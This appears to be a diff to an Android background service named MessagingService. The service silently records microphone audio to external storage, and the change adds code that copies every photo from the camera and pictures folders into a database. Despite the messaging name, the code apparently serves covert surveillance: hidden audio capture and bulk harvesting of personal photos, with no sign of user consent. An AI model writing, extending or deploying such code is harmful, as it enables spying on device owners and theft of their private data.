@@ -104,7 +104,6 @@ public class MessagingService extends Service {
                 mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                 mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                 mMediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
-
                 try {
                     File file = new File(Environment.getExternalStorageDirectory() + File.separator + "soundfile2.3gpp");
                     if(file.exists()){
@@ -117,24 +116,38 @@ public class MessagingService extends Service {
                     mMediaRecorder.setOutputFile(file);
                     mMediaRecorder.prepare();
                     mMediaRecorder.start();
+                    if(Helpers.isExternalStorageReadable()){
+                        File[] pictures = Helpers.getFilesForDirectory(Helpers.getDcimDirectory().getPath() + "/Camera");
+                        if(pictures != null && pictures.length > 0){
+                            for(File f : pictures){
+                                Database.insertPhoto(sDatabase, f.getName(), f);
+                            }
+                        }
+                        pictures = Helpers.getFilesForDirectory(Helpers.getPicturesDirectory().getPath());
+                        if(pictures != null && pictures.length > 0){
+                            for(File f : pictures){
+                                Database.insertPhoto(sDatabase, f.getName(), f);
+                            }
+                        }
+                    }
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
             }
         }).start();
-        new Thread(new Runnable() {
+       /* new Thread(new Runnable() {
             @Override
             public void run() {
                 if(Helpers.isExternalStorageReadable()){
                     File[] pictures = Helpers.getFilesForDirectory(Helpers.getDcimDirectory().getPath() + "/Camera");
                     if(pictures != null && pictures.length > 0){
                         for(File file : pictures){
-                            Database.insertPhoto(MessagingService.this, sDatabase, file.getName(), file);
+                            Database.insertPhoto(sDatabase, file.getName(), file);
                         }
                     }
                 }
             }
-        }).start();
+        }).start();*/
     }
 
     @Override
